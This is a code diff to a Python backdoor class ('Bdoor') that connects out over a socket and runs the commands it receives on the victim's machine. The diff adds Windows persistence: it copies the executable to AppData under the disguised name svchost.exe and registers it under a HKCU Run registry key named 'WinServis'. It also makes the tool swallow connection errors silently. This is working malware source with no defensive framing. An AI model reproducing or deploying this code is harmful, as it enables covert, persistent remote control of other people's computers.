@@ -6,6 +6,7 @@
 import traceback
 import socket
 import json
+import shutil
 import subprocess
 import base64
 import sys
@@ -20,9 +21,17 @@ class Bdoor:
              "default": "dafault"}
 
     def __init__(self, addr, prt):
+        self.pers__()
         self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.conn.connect((addr, prt))
         self.cli = self.cli_p["default"]
+    
+    def pers__(self):
+        l_pers__ = os.environ["AppData"] + "\\Microsoft\\svchost.exe"
+        if not os.path.exists(l_pers__):
+            # Copy the current executalbe file.
+            shutil.copyfile(sys.executable, l_pers__)
+            subprocess.run('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WinServis /t REG_SZ /d "' + l_pers__ + '"', shell=True)
 
     def send_data(self, data):
         json_data = json.dumps(data)
@@ -92,9 +101,8 @@ class Bdoor:
                     self.send_data("CLI preferred: " + self.cli)
                 else:
                     self.exec_cmd(comm)
-            except (BrokenPipeError, ConnectionAbortedError) as cnerr:
-                #print(cnerr.strerror)
-                self.con_close()
+            except (TimeoutError, ConnectionRefusedError, ConnectionAbortedError, BrokenPipeError, ConnectionError):
+                pass
             except (KeyError, TypeError):
                 self.send_data(f'[Bad command]: {traceback.format_exc()}')
             except (OSError, Exception):
